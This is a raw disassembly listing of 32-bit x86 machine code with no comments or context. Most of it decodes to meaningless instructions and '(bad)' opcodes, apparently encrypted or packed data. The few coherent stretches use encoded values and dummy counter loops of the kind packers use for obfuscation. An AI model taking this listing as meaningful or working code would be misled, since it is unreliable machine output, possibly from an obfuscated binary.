  40e50f:	mov    ebx,DWORD PTR [edx-0x2803ffef]
  40e515:	jecxz  0x40e58d
  40e517:	cli    
  40e518:	push   edx
  40e519:	or     al,0x60
  40e51b:	xchg   ebp,eax
  40e51c:	jecxz  0x40e571
  40e51e:	push   ecx
  40e51f:	jmp    0x40e4ce
  40e521:	int    0xd4
  40e523:	mov    DWORD PTR [ecx],edx
  40e525:	add    eax,0x23
  40e528:	push   edx
  40e529:	movzx  esp,WORD PTR [edx+0x3c3f9058]
  40e530:	bound  esp,QWORD PTR [edi]
  40e532:	or     BYTE PTR ds:0xefbaa67b,ah
  40e538:	or     BYTE PTR [edi],al
  40e53a:	cmp    edi,0x81f4458b
  40e540:	or     eax,0x4337a3
  40e545:	jmp    0x40e57e
  40e547:	inc    ebx
  40e548:	add    BYTE PTR [ebx],dh
  40e54a:	mov    BYTE PTR [ebx],0xc3
  40e54d:	sbb    DWORD PTR ds:0x4337db,0x4337af
  40e557:	mov    DWORD PTR [ebp-0x54],eax
  40e55a:	lea    eax,[ebp-0x1c]
  40e55d:	mov    DWORD PTR [ebp-0x50],eax
  40e560:	mov    eax,DWORD PTR [ebp-0x60]
  40e563:	xor    eax,esi
  40e565:	add    eax,ebx
  40e567:	mov    DWORD PTR [ebp-0x60],eax
  40e56a:	lea    eax,[ebp-0x60]
  40e56d:	push   eax
  40e56e:	mov    eax,DWORD PTR [ebp+0xc]
  40e571:	xor    eax,esi
  40e573:	add    eax,ebx
  40e575:	push   eax
  40e576:	mov    eax,ds:0x413b54
  40e57b:	push   0x413aaa
  40e580:	push   DWORD PTR [eax]
  40e582:	call   0x40984d
  40e587:	jmp    0x40e830
  40e58c:	cmp    edi,0x13d
  40e592:	jne    0x40e830
  40e598:	mov    eax,DWORD PTR [ebp-0x10]
  40e59b:	xor    eax,esi
  40e59d:	add    eax,ebx
  40e59f:	mov    DWORD PTR [ebp+0x8],eax
  40e5a2:	jmp    0x40e6db
  40e5a7:	shl    BYTE PTR [eax+eax*8-0xf8f9fd0],0x74
  40e5af:	sub    eax,0xddf261b8
  40e5b4:	adc    BYTE PTR [edi],dl
  40e5b6:	mov    eax,0x7e7e992a
  40e5bb:	adc    bh,BYTE PTR [edi+0x7e]
  40e5be:	jle    0x40e5e3
  40e5c0:	jno    0x40e56e
  40e5c2:	xlat   BYTE PTR ds:[ebx]
  40e5c3:	dec    ebx
  40e5c4:	xchg   edx,eax
  40e5c5:	inc    esi
  40e5c6:	call   0x50690ff5
  40e5cb:	pop    esp
  40e5cc:	mov    eax,0xc7980a5b
  40e5d1:	cmp    BYTE PTR [ebp-0x48d50b90],al
  40e5d7:	mov    bl,BYTE PTR [ecx+0x2a855469]
  40e5dd:	ror    BYTE PTR [edx-0x2b],0x7e
  40e5e1:	inc    esp
  40e5e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e5e3:	ret    
  40e5e4:	ret    
  40e5e5:	xlat   BYTE PTR ds:[ebx]
  40e5e6:	push   ecx
  40e5e7:	fnstcw WORD PTR [ecx]
  40e5e9:	dec    edi
  40e5ea:	xchg   ebx,eax
  40e5eb:	lock fs or al,bl
  40e5ef:	inc    ecx
  40e5f0:	enter  0x1d49,0x3
  40e5f4:	ret    
  40e5f5:	dec    esp
  40e5f6:	das    
  40e5f7:	inc    eax
  40e5f8:	jmp    0x98c757b8
  40e5fd:	mov    es,WORD PTR [esi+0x6e]
  40e600:	mov    bh,bh
  40e602:	fwait
  40e603:	xchg   ebp,eax
  40e604:	sti    
  40e605:	inc    esi
  40e606:	jp     0x40e662
  40e608:	or     DWORD PTR [edi+0x7bcb0882],edi
  40e60e:	aam    0xe8
  40e610:	scas   eax,DWORD PTR es:[edi]
  40e611:	push   edi
  40e612:	test   esi,eax
  40e614:	div    DWORD PTR [ebx]
  40e616:	mov    ds:0x846ae6dd,al
  40e61b:	sbb    dh,BYTE PTR [ebp-0x714b4046]
  40e621:	call   0x518705a2
  40e626:	shl    BYTE PTR [esi+0x70],1
  40e629:	fisub  WORD PTR [edx+0x2982ecbe]
  40e62f:	fwait
  40e630:	or     al,0x5b
  40e632:	add    BYTE PTR [eax],cl
  40e634:	mov    ds:0xf346ea9e,eax
  40e639:	mov    ds:0x6e43fb05,eax
  40e63e:	(bad)
  40e642:	outs   dx,DWORD PTR ds:[esi]
  40e643:	xchg   edi,eax
  40e644:	pop    DWORD PTR [ebx]
  40e646:	mov    al,ds:0xb53bef00
  40e64b:	sbb    cl,BYTE PTR [esi+0x74]
  40e64e:	pushf  
  40e64f:	(bad)  
  40e650:	or     ebx,ebx
  40e652:	das    
  40e653:	int    0xbf
  40e655:	stos   BYTE PTR es:[edi],al
  40e656:	xchg   DWORD PTR [ecx+0x5a],edx
  40e659:	imul   ebp,DWORD PTR [eax+0x18b33ee3],0xc86e21d4
  40e663:	std    
  40e664:	sbb    DWORD PTR [ebx-0x1],edi
  40e667:	jp     0x40e64d
  40e669:	jmp    0x40e697
  40e66b:	nop
  40e66c:	or     edx,DWORD PTR [ebp+0x1c]
  40e66f:	inc    ebp
  40e670:	sbb    eax,0x272d7246
  40e675:	pop    ss
  40e676:	adc    DWORD PTR [ebx+ebp*2],ecx
  40e679:	mov    edx,0x749415df
  40e67e:	push   ebx
  40e67f:	cmp    ch,BYTE PTR [ebp-0x47]
  40e682:	jecxz  0x40e6ac
  40e684:	adc    al,0xb9
  40e686:	into   
  40e687:	out    0x57,al
  40e689:	and    eax,DWORD PTR [ecx]
  40e68b:	or     DWORD PTR [esi-0x19],0x304bebfc
  40e692:	mov    esp,0x6a379f
  40e697:	cdq    
  40e698:	add    ch,BYTE PTR [ecx]
  40e69a:	pop    ds
  40e69b:	dec    edi
  40e69c:	and    BYTE PTR es:[edx-0x49],0x91
  40e6a1:	ror    BYTE PTR [ebp+0x5e],cl
  40e6a4:	push   cs
  40e6a5:	daa    
  40e6a6:	scas   eax,DWORD PTR es:[edi]
  40e6a7:	shr    DWORD PTR [edx],0xc
  40e6aa:	bound  edx,QWORD PTR [eax]
  40e6ac:	popa   
  40e6ad:	jae    0x40e648
  40e6af:	stc    
  40e6b0:	pop    ss
  40e6b1:	mov    edi,ebx
  40e6b3:	mov    WORD PTR [edi+0x380487f6],?
  40e6b9:	je     0x40e736
  40e6bb:	sub    ebx,ecx
  40e6bd:	lock lea esp,[esp+edi*4-0x7a]
  40e6c2:	cmp    ebp,DWORD PTR [edx-0x37e361ae]
  40e6c8:	xchg   esi,eax
  40e6c9:	iret   
  40e6ca:	aad    0x45
  40e6cc:	mov    DWORD PTR [edi+0x7c],esp
  40e6cf:	shl    WORD PTR [edx+0x7a],cl
  40e6d3:	(bad)  
  40e6d5:	test   ebx,ecx
  40e6d7:	div    DWORD PTR ds:0x34a1db16
  40e6dd:	cmp    eax,DWORD PTR [ecx+0x0]
  40e6e0:	mov    DWORD PTR [ebp+0x8],eax
  40e6e3:	mov    eax,DWORD PTR [ebp-0x14]
  40e6e6:	jmp    0x40e81f
  40e6eb:	jb     0x40e70f
  40e6ed:	lods   al,BYTE PTR ds:[esi]
  40e6ee:	jmp    0x9bdf:0xa270706c
  40e6f5:	mov    al,BYTE PTR [ecx-0xe470513]
  40e6fb:	into   
  40e6fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6fd:	jle    0x40e77d
  40e6ff:	adc    bh,BYTE PTR [edi+0x7e]
  40e702:	jle    0x40e6ac
  40e704:	xchg   edi,eax
  40e705:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e706:	imul   ebx,esp,0x5432396b
  40e70c:	ins    BYTE PTR es:[edi],dx
  40e70d:	inc    bh
  40e70f:	shr    BYTE PTR cs:0x7a9910e3,cl
  40e716:	ss jge 0x40e71e
  40e719:	lea    esi,[esp+edx*8-0x7]
  40e71d:	jl     0x40e759
  40e71f:	mov    ebp,0x5d51b07c
  40e724:	mov    dh,0x3f
  40e726:	dec    edx
  40e727:	jmp    0x8a5a:0xf1cf115f
  40e72e:	inc    BYTE PTR [ebp+0x7359fc51]
  40e734:	sahf   
  40e735:	pop    ecx
  40e736:	sbb    eax,0xb389b4ee
  40e73b:	pop    ebp
  40e73c:	sar    BYTE PTR [ebx+esi*8-0x128d0906],0xd7
  40e744:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e745:	jns    0x40e7a2
  40e747:	adc    esi,DWORD PTR [esi]
  40e749:	push   edx
  40e74a:	jae    0x40e787
  40e74c:	cdq    
  40e74d:	xor    cl,BYTE PTR [eax+eax*4-0x31ae9c05]
  40e754:	push   ecx
  40e755:	sbb    ebx,esp
  40e757:	fistp  WORD PTR [ebx]
  40e759:	dec    ebp
  40e75a:	cmp    eax,0x4bf63b46
  40e75f:	loope  0x40e6f5
  40e761:	jmp    0xfe70:0xdb34be1a
  40e768:	cwde   
  40e769:	add    DWORD PTR [ebp+0x4c90672d],edx
  40e76f:	pop    eax
  40e770:	daa    
  40e771:	xor    DWORD PTR [ebp-0x6d],ecx
  40e774:	je     0x40e7ac
  40e776:	cmp    BYTE PTR [edi-0x4e59085b],cl
  40e77c:	out    0x70,eax
  40e77e:	push   esi
  40e77f:	mov    edx,ebp
  40e781:	mov    cl,0x2c
  40e783:	icebp  
  40e784:	mov    al,0x23
  40e786:	repnz nop
  40e788:	cs mov bh,0xe9
  40e78b:	dec    edi
  40e78c:	mov    bh,0xe5
  40e78e:	loop   0x40e7a6
  40e790:	dec    DWORD PTR ds:0xcd6bed2c
  40e796:	fld    QWORD PTR [edx-0x4aee5d1d]
  40e79c:	xchg   ecx,eax
  40e79d:	aas    
  40e79e:	in     al,dx
  40e79f:	pop    esi
  40e7a0:	data16 mov BYTE PTR [ecx+0x42],dh
  40e7a4:	fwait
  40e7a5:	aaa    
  40e7a6:	push   edi
  40e7a7:	jb     0x40e803
  40e7a9:	lods   al,BYTE PTR ds:[esi]
  40e7aa:	fistp  QWORD PTR [esi+0x22]
  40e7ad:	mov    al,0x5e
  40e7af:	add    eax,0x7e156516
  40e7b4:	psubsb mm0,QWORD PTR [ebp+0x4602a370]
  40e7bb:	push   cs
  40e7bc:	imul   ebx,ecx,0x79
  40e7bf:	cmc    
  40e7c0:	(bad)  
  40e7c1:	in     eax,0x38
  40e7c3:	xchg   dh,ah
  40e7c5:	stos   BYTE PTR es:[edi],al
  40e7c6:	sub    ah,ch
  40e7c8:	pop    ebx
  40e7c9:	aam    0x41
  40e7cb:	xchg   esp,eax
  40e7cc:	stos   BYTE PTR es:[edi],al
  40e7cd:	test   DWORD PTR [esp+ebp*2+0x7f],edx
  40e7d1:	xchg   ebp,eax
  40e7d2:	sbb    ch,dh
  40e7d4:	cwde   
  40e7d5:	pop    eax
  40e7d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e7d7:	xchg   esi,eax
  40e7d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e7d9:	mov    ebx,0xaf2f5285
  40e7de:	cmp    ah,BYTE PTR [edx+edx*8+0x4b]
  40e7e2:	push   es
  40e7e3:	nop
  40e7e4:	nop
  40e7e5:	push   eax
  40e7e6:	fld    TBYTE PTR [ecx-0x7c]
  40e7e9:	inc    eax
  40e7ea:	add    eax,ebp
  40e7ec:	push   ebx
  40e7ed:	clc    
  40e7ee:	retf   0x72aa
  40e7f1:	mov    ebx,0x3d03fd74
  40e7f6:	dec    eax
  40e7f7:	xchg   esi,eax
  40e7f8:	mov    ebp,0xc7e7b6e4
  40e7fd:	dec    ecx
  40e7fe:	outs   dx,DWORD PTR ds:[esi]
  40e7ff:	pop    es
  40e800:	jmp    0x40e847
  40e802:	ins    DWORD PTR es:[edi],dx
  40e803:	cs test al,0x29
  40e806:	add    al,0x25
  40e808:	add    DWORD PTR [ebp*8-0x6bb12e4e],0xffffffb6
  40e810:	cmp    eax,0xc2ffbf44
  40e815:	mov    bl,0x90
  40e817:	adc    eax,0x91102bd3
  40e81c:	sub    bh,0xbc
  40e81f:	mov    DWORD PTR [ebp-0x4],eax
  40e822:	mov    eax,DWORD PTR [ebp-0x4]
  40e825:	push   0x4
  40e827:	pop    ecx
  40e828:	sub    ecx,eax
  40e82a:	add    ecx,DWORD PTR [ebp-0x18]
  40e82d:	mov    DWORD PTR [ebp-0x8],ecx
  40e830:	mov    eax,DWORD PTR [ebp+0xc]
  40e833:	xor    eax,esi
  40e835:	lea    edi,[edi+eax*1+0x32729b]
  40e83c:	cmp    edi,0x50b
  40e842:	jmp    0x40e97b
  40e847:	xor    al,0xd8
  40e849:	xchg   ebx,eax
  40e84a:	das    
  40e84b:	push   ebx
  40e84c:	jne    0x40e7fe
  40e84e:	loope  0x40e887
  40e850:	jecxz  0x40e800
  40e852:	loope  0x40e8b6
  40e854:	inc    ebx
  40e855:	jg     0x40e7d9
  40e857:	loop   0x40e800
  40e859:	jle    0x40e8d9
  40e85b:	adc    bh,BYTE PTR [edi+0x7e]
  40e85e:	jle    0x40e883
  40e860:	cmovb  esi,DWORD PTR ds:0x942a507b
  40e867:	ror    DWORD PTR [edi-0x11ca2a1f],0x34
  40e86e:	push   esi
  40e86f:	jo     0x40e857
  40e871:	xchg   BYTE PTR [edi],dl
  40e873:	cmp    BYTE PTR [ebp+esi*2+0x69],0xa0
  40e878:	stos   DWORD PTR es:[edi],eax
  40e879:	mov    ecx,0x45c2924
  40e87e:	rcr    BYTE PTR ds:0xe3e87835,cl
  40e884:	xor    ah,BYTE PTR [edx-0x3a]
  40e887:	mov    bh,0x38
  40e889:	mov    al,ds:0xde552baf
  40e88e:	cmp    eax,0xeedf4ecb
  40e893:	ds inc ebp
  40e895:	mov    ebx,0xf2b90b77
  40e89a:	outs   dx,BYTE PTR ds:[esi]
  40e89b:	adc    al,0x32
  40e89d:	push   esp
  40e89e:	add    ah,bh
  40e8a0:	clc    
  40e8a1:	dec    esp
  40e8a2:	sub    eax,0x5f74c5eb
  40e8a7:	or     al,0xf0
  40e8a9:	repz sub al,0x97
  40e8ac:	mov    ?,WORD PTR [edi+0x885aa56]
  40e8b2:	cmp    DWORD PTR [ebp-0x3281ff00],ecx
  40e8b8:	push   edi
  40e8b9:	or     DWORD PTR [esi-0x5c],ebp
  40e8bc:	jg     0x40e85f
  40e8be:	out    0xf3,eax
  40e8c0:	adc    eax,0x6e0972b3
  40e8c5:	xchg   esp,eax
  40e8c6:	fimul  WORD PTR [ecx]
  40e8c8:	gs jnp 0x40e918
  40e8cb:	leave  
  40e8cc:	inc    ecx
  40e8cd:	push   ss
  40e8ce:	dec    esp
  40e8cf:	cli    
  40e8d0:	loop   0x40e8cb
  40e8d2:	pop    eax
  40e8d3:	inc    ecx
  40e8d4:	fdivr  DWORD PTR [edi-0x60c9076e]
  40e8da:	(bad)
  40e8de:	add    BYTE PTR [ecx],0xd6
  40e8e1:	loop   0x40e8ad
  40e8e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e8e4:	imul   esp,DWORD PTR ds:[edx],0xffffffc7
  40e8e8:	xchg   ebp,eax
  40e8e9:	jo     0x40e8ff
  40e8eb:	in     eax,dx
  40e8ec:	repnz and eax,0xee438c07
  40e8f2:	xor    ah,BYTE PTR [edi+ebx*2+0x59]
  40e8f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e8f7:	add    eax,0x2eb06d27
  40e8fc:	jmp    0x40e881
  40e8fe:	pop    ss
  40e8ff:	cwde   
  40e900:	js     0x40e963
  40e902:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e904:	and    al,0x94
  40e906:	je     0x40e8be
  40e908:	in     eax,0x3a
  40e90a:	and    BYTE PTR [edx+eiz*4],dl
  40e90d:	call   0xb1af:0x2817b35c
  40e914:	call   0x767ed233
  40e919:	push   ss
  40e91a:	push   0x4476411
  40e91f:	ficomp DWORD PTR [ebx-0x7ebeb1f6]
  40e925:	jbe    0x40e997
  40e927:	les    ecx,FWORD PTR [edi-0x70cf1db0]
  40e92d:	mov    esp,edi
  40e92f:	cld    
  40e930:	aas    
  40e931:	imul   ebp,edi,0x37
  40e934:	lahf   
  40e935:	ret    
  40e936:	std    
  40e937:	aas    
  40e938:	jo     0x40e966
  40e93a:	shl    esp,0x68
  40e93d:	xchg   edi,eax
  40e93e:	(bad)  
  40e93f:	arpl   WORD PTR [ebp-0x6c],dx
  40e942:	pop    esp
  40e943:	push   es
  40e944:	mov    al,0xd9
  40e946:	bound  ecx,QWORD PTR [esi-0x11]
  40e949:	fs inc ebx
  40e94b:	jle    0x40e911
  40e94d:	mov    al,0xa9
  40e94f:	pop    eax
  40e950:	mov    edi,DWORD PTR [ebp-0x2007a0fd]
  40e956:	stos   DWORD PTR es:[edi],eax
  40e957:	inc    ebx
  40e958:	sub    eax,0xf97a6962
  40e95d:	inc    BYTE PTR [ebx-0x30]
  40e960:	push   0xffffff84
  40e962:	push   esi
  40e963:	lahf   
  40e964:	cli    
  40e965:	and    ecx,esp
  40e967:	push   ebp
  40e968:	xchg   ebp,eax
  40e969:	lods   eax,DWORD PTR ds:[esi]
  40e96a:	jecxz  0x40e9a5
  40e96c:	cli    
  40e96d:	cmp    al,dh
  40e96f:	sub    DWORD PTR [ecx+0x12e9378c],ebp
  40e975:	sbb    eax,0xbeb254f8
  40e97a:	loopne 0x40e98b
  40e97c:	test   DWORD PTR [esi],edi
  40e97e:	stc    
  40e97f:	(bad)  
  40e980:	dec    DWORD PTR [ebx+0x335f0c45]
  40e986:	(bad)  
  40e987:	pop    esi
  40e988:	jmp    0x40eac1
  40e98d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e98e:	sbb    bl,dh
  40e990:	loope  0x40ea05
  40e992:	icebp  
  40e993:	mov    ch,0x58
  40e995:	jns    0x40e920
  40e997:	add    eax,0xdaed291d
  40e99c:	mov    dh,0x86
  40e99e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e99f:	jle    0x40ea1f
  40e9a1:	adc    bh,BYTE PTR [edi+0x7e]
  40e9a4:	jle    0x40e92e
  40e9a6:	add    edx,ebx
  40e9a8:	mov    cl,0xaf
  40e9aa:	push   ebp
  40e9ab:	out    dx,al
  40e9ac:	scas   al,BYTE PTR es:[edi]
  40e9ad:	or     cl,BYTE PTR [esi-0x5b]
  40e9b0:	adc    ebp,DWORD PTR [edx-0x3b]
  40e9b3:	mov    ebp,0x84eaa579
  40e9b8:	inc    ecx
  40e9b9:	mov    esi,DWORD PTR [eax+0x2c]
  40e9bc:	ins    BYTE PTR es:[edi],dx
  40e9bd:	ins    BYTE PTR es:[edi],dx
  40e9be:	add    ch,bl
  40e9c0:	mov    ds:0x59ff910c,al
  40e9c5:	les    esp,FWORD PTR [edx+0x5a2cb9a2]
  40e9cb:	xchg   ebp,eax
  40e9cc:	adc    dl,BYTE PTR [ebx]
  40e9ce:	jo     0x40e95f
  40e9d0:	cmp    eax,0x25325cef
  40e9d5:	in     al,dx
  40e9d6:	scas   al,BYTE PTR es:[edi]
  40e9d7:	jnp    0x40ea00
  40e9d9:	xchg   esp,eax
  40e9da:	lods   eax,DWORD PTR ds:[esi]
  40e9db:	je     0x40e973
  40e9dd:	and    edx,DWORD PTR [edi+0x5a4e0cd]
  40e9e3:	or     bl,ch
  40e9e5:	sub    al,0x50
  40e9e7:	push   esp
  40e9e8:	sub    eax,0xccb058df
  40e9ed:	cmp    ch,BYTE PTR [ebx-0xc25c409]
  40e9f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e9f4:	icebp  
  40e9f5:	add    bh,BYTE PTR [ebx]
  40e9f7:	pop    edx
  40e9f8:	outs   dx,BYTE PTR ds:[esi]
  40e9f9:	aas    
  40e9fa:	adc    ebp,edi
  40e9fc:	lahf   
  40e9fd:	aaa    
  40e9fe:	sbb    al,0xd
  40ea00:	adc    eax,0x23bf2d91
  40ea05:	jle    0x40e9ef
  40ea07:	aas    
  40ea08:	xchg   eax,eax
  40ea0a:	in     eax,dx
  40ea0b:	(bad)  
  40ea0c:	cmp    edx,ecx
  40ea0e:	pop    es
  40ea0f:	in     al,dx
  40ea10:	xchg   ebp,eax
  40ea11:	xlat   BYTE PTR ds:[ebx]
  40ea12:	in     al,dx
  40ea13:	call   0xcdd8:0x4d689c5a
  40ea1a:	jle    0x40ea3f
  40ea1c:	mov    WORD PTR [ecx],?
  40ea1e:	sbb    al,0x66
  40ea20:	jne    0x40e9fc
  40ea22:	mov    dh,0x88
  40ea24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ea25:	xchg   edx,eax
  40ea26:	fsubr  DWORD PTR [edx]
  40ea28:	jno    0x40eaa7
  40ea2a:	push   esi
  40ea2b:	into   
  40ea2c:	ds je  0x40e9c2
  40ea2f:	or     bl,bh
  40ea31:	test   BYTE PTR [eax-0x664e9841],bl
  40ea37:	mov    bl,0x5d
  40ea39:	adc    edx,DWORD PTR [ecx+eiz*4+0x65]
  40ea3d:	inc    ebp
  40ea3e:	cli    
  40ea3f:	or     DWORD PTR [ebx+0x1b0353cf],ebx
  40ea45:	mov    edi,0x1823b208
  40ea4a:	dec    eax
  40ea4b:	retf   0x9219
  40ea4e:	cmp    DWORD PTR [edx],0x76
  40ea51:	call   FWORD PTR [ecx]
  40ea53:	dec    eax
  40ea54:	lfs    edx,FWORD PTR [edi]
  40ea57:	(bad)  
  40ea59:	mov    bh,0x63
  40ea5b:	push   ss
  40ea5c:	push   0x37a8b3a8
  40ea61:	fbstp  TBYTE PTR cs:[ebp-0x37]
  40ea65:	sti    
  40ea66:	and    BYTE PTR [edi+0x4c],0xed
  40ea6a:	dec    esi
  40ea6b:	(bad)  
  40ea6d:	push   ebp
  40ea6e:	fcomp  QWORD PTR [ebx]
  40ea70:	imul   ebx,DWORD PTR [ebp+0x55bd7040],0x11
  40ea77:	pusha  
  40ea78:	inc    ebp
  40ea79:	fisttp QWORD PTR [edx+0xa5a2971]
  40ea7f:	cld    
  40ea80:	stc    
  40ea81:	shl    BYTE PTR [edx-0x74],cl
  40ea84:	and    BYTE PTR [edi+0x3a],dl
  40ea87:	pop    ds
  40ea88:	leave  
  40ea89:	push   cs
  40ea8a:	popa   
  40ea8b:	inc    eax
  40ea8c:	xor    cl,BYTE PTR [eax-0x39]
  40ea8f:	lods   al,BYTE PTR ds:[esi]
  40ea90:	pop    ebx
  40ea91:	pop    edi
  40ea92:	iret   
  40ea93:	xor    al,0x68
  40ea95:	cmp    al,0x18
  40ea97:	and    DWORD PTR [ebx+0x1d259c99],ebp
  40ea9d:	jb     0x40eae6
  40ea9f:	add    al,0x3
  40eaa1:	cld    
  40eaa2:	ins    DWORD PTR es:[edi],dx
  40eaa3:	loope  0x40eac1
  40eaa5:	popa   
  40eaa6:	sbb    dh,BYTE PTR [edi-0xa4f4c00]
  40eaac:	mov    bl,0x4c
  40eaae:	fisttp DWORD PTR [ecx-0x1e]
  40eab1:	mov    ds:0xab0b079c,al
  40eab6:	scas   eax,DWORD PTR es:[edi]
  40eab7:	ss pop esp
  40eab9:	jne    0x40eac7
  40eabb:	xchg   DWORD PTR [esi],edi
  40eabd:	cmp    ah,BYTE PTR [edx+0x52]
  40eac0:	arpl   WORD PTR [ebx],ax
  40eac2:	ret    
  40eac3:	pop    ebx
  40eac4:	leave  
  40eac5:	ret    0x8
  40eac8:	push   ebp
  40eac9:	mov    ebp,esp
  40eacb:	push   ecx
  40eacc:	mov    DWORD PTR ds:0x433793,0x1f
  40ead6:	cmp    DWORD PTR ds:0x433793,0x0
  40eadd:	je     0x40eb79
  40eae3:	cmp    DWORD PTR ds:0x433793,0xc
  40eaea:	jne    0x40eafe
  40eaf0:	push   0x1b35
  40eaf5:	push   DWORD PTR [ebp-0x14]
  40eaf8:	call   DWORD PTR ds:0x412368
  40eafe:	cmp    DWORD PTR ds:0x433793,0xd
  40eb05:	jne    0x40eb18
  40eb0b:	mov    edx,DWORD PTR ds:0x433793
  40eb11:	dec    edx
  40eb12:	mov    DWORD PTR ds:0x433793,edx
  40eb18:	mov    edx,DWORD PTR ds:0x433793
  40eb1e:	dec    edx
  40eb1f:	mov    DWORD PTR ds:0x433793,edx
  40eb25:	jmp    0x40ead6
  40eb2a:	mov    DWORD PTR ds:0x4337d3,0x16
  40eb34:	cmp    DWORD PTR ds:0x4337d3,0x0
  40eb3b:	je     0x40eb79
  40eb41:	cmp    DWORD PTR ds:0x4337d3,0x17
  40eb48:	jne    0x40eb5f
  40eb4e:	push   DWORD PTR [ebp-0x14]
  40eb51:	push   DWORD PTR [ebp-0xc]
  40eb54:	push   0x495a
  40eb59:	call   DWORD PTR ds:0x4120ec
  40eb5f:	mov    eax,ds:0x4337d3
  40eb64:	dec    eax
  40eb65:	mov    ds:0x4337d3,eax
  40eb6a:	jmp    0x40eb34
  40eb6f:	mov    DWORD PTR ds:0x4337e3,0x352
  40eb79:	push   ecx
  40eb7a:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  40eb81:	sbb    DWORD PTR ds:0x43379b,edx
  40eb87:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  40eb8e:	mov    eax,DWORD PTR [ebp-0x4]
  40eb91:	push   esi
  40eb92:	add    DWORD PTR ds:0x43382b,ebx
  40eb98:	mov    esi,DWORD PTR [ebp-0x8]
  40eb9b:	adc    ecx,edx
  40eb9d:	mov    edx,0x7510854
  40eba2:	jmp    0x40ed99
  40eba7:	imul   ebx,DWORD PTR [ebx+0x72cf420f],0x73
  40ebae:	mov    bl,0xda
  40ebb0:	jecxz  0x40eb5f
  40ebb2:	sbb    ch,BYTE PTR [edx]
  40ebb4:	jmp    0x40ec03
  40ebb6:	out    0x9a,al
  40ebb8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ebb9:	jle    0x40ec39
  40ebbb:	push   esp
  40ebbc:	jg     0x40ec3c
  40ebbe:	jle    0x40eb5c
  40ebc0:	push   ebp
  40ebc1:	ret    0xd20
  40ebc4:	retf   
  40ebc5:	cmp    eax,0x5eb58e99
  40ebca:	gs je  0x40eba3
  40ebcd:	mov    dh,0x79
  40ebcf:	add    al,0xde
  40ebd1:	mov    ch,0xd4
  40ebd3:	clc    
  40ebd4:	cli    
  40ebd5:	mov    ds:0x6cb754e0,eax
  40ebda:	mov    ss,WORD PTR [edx+0x3d9259fa]
  40ebe0:	sub    al,0x21
  40ebe2:	mov    ds:0x12504ad1,eax
  40ebe7:	div    DWORD PTR [ebx-0x7f7560f0]
  40ebed:	div    DWORD PTR [edi+ecx*4+0x52d0ee3b]
  40ebf4:	pop    ds
  40ebf5:	sbb    BYTE PTR [ecx-0x2a],bh
  40ebf8:	jne    0x40ebed
  40ebfa:	mov    dl,0x2c
  40ebfc:	push   edx
  40ebfd:	pusha  
  40ebfe:	ds popa 
  40ec00:	mov    cs,WORD PTR [edi-0x32]
  40ec03:	mov    al,0xb6
  40ec05:	js     0x40ebf8
  40ec07:	lahf   
  40ec08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ec09:	out    dx,eax
  40ec0a:	out    dx,al
  40ec0b:	dec    edi
  40ec0c:	in     al,dx
  40ec0d:	das    
  40ec0e:	pop    ebp
  40ec0f:	in     al,0x63
  40ec11:	imul   ebp,DWORD PTR [edi-0x75055255],0x5d4d0be3
  40ec1b:	sbb    dh,BYTE PTR [edi-0x51]
  40ec1e:	and    DWORD PTR [esp+ebp*1-0x4d],edx
  40ec22:	inc    eax
  40ec23:	mov    ds:0xfd6e2300,eax
  40ec28:	ins    DWORD PTR es:[edi],dx
  40ec29:	jo     0x40ec57
  40ec2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ec2c:	inc    ecx
  40ec2d:	fild   QWORD PTR [edx+0x9d3c73]
  40ec33:	xor    eax,0x9ab9888
  40ec38:	jnp    0x40ec6a
  40ec3a:	push   esp
  40ec3b:	addr16 inc ebx
  40ec3d:	mov    edi,0x45d5929c
  40ec42:	stc    
  40ec43:	xchg   esp,eax
  40ec44:	int    0x2a
  40ec46:	pop    eax
  40ec47:	sahf   
  40ec48:	(bad)  
  40ec49:	ins    DWORD PTR es:[edi],dx
  40ec4a:	push   0x6e167c62
  40ec4f:	and    dh,BYTE PTR [edi]
  40ec51:	sub    DWORD PTR [edi],ebx
  40ec53:	jne    0x40ecca
  40ec55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ec56:	std    
  40ec57:	inc    ecx
  40ec58:	mov    bl,0x88
  40ec5a:	mov    al,0x6b
  40ec5c:	pop    edi
  40ec5d:	push   esp
  40ec5e:	adc    ah,0xbd
  40ec61:	mov    bh,0xce
  40ec63:	fmul   DWORD PTR [edi]
  40ec66:	data16 hlt 
  40ec68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ec69:	daa    
  40ec6a:	call   0x232a:0xb246d15b
  40ec71:	dec    ebp
  40ec72:	xor    al,0xdf
  40ec74:	and    DWORD PTR [eax*1+0x5a35b70e],edx
  40ec7b:	arpl   WORD PTR [eax],di
  40ec7d:	sar    DWORD PTR [ebp+0x27450c1d],0x8d
  40ec84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ec85:	inc    ebp
  40ec86:	das    
  40ec87:	sbb    DWORD PTR [edx+0x20],ecx
  40ec8a:	jecxz  0x40ec99
  40ec8c:	leave  
  40ec8d:	out    0x11,al
  40ec8f:	aaa    
  40ec90:	pop    ds
  40ec91:	mov    eax,ds:0x1eb52b6b
  40ec97:	aaa    
  40ec98:	xchg   ecx,eax
  40ec99:	sahf   
  40ec9a:	sahf   
  40ec9b:	mov    esi,DWORD PTR [ebx-0x46b4b316]
  40eca1:	sub    BYTE PTR [esi],ah
  40eca3:	sub    BYTE PTR [ebx+0x14],0xb7
